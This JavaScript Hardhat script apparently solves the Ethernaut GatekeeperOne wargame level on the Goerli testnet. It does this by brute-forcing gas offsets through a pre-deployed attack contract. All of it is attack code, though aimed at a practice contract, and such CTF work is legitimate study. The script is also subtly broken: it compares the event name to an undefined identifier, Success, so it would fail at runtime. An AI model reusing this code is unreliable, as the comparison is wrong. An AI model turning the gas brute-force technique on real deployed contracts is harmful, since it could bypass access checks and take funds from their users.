const { ethers } = require("hardhat")

async function main() {
    /*
    Script to pass GatekeeperOne level on Goerli network
    GatekeeperOneAttack_v2 contract must be pre-deployed
    */

    const attackAddress = "0x2624Cc49e6A0Ee5Db27E72e7bcAC9c5929682FbE"

    const { deployer } = await ethers.getNamedSigners()
    const initialBalance = await ethers.provider.getBalance(deployer.address)
    const attack = await ethers.getContractAt("GatekeeperOneAttack", attackAddress)

    // test gas limits 200 at a time
    for (let i = 0; i < 41; i++) {
        const a = i * 200
        const b = a + 200
        const tx = await attack.enterBruteForce(a, b)
        const txReceipt = await tx.wait()
        const result = txReceipt.events[0].event
        if (result == Success) {
            // we have successfully become entrant
            break
        }
    }

    const finalBalance = await ethers.provider.getBalance(deployer.address)
    console.log("")
    console.log(
        `Gas spent: ${ethers.utils.formatEther(initialBalance.sub(finalBalance).toString())} ETH`
    )
}

main()
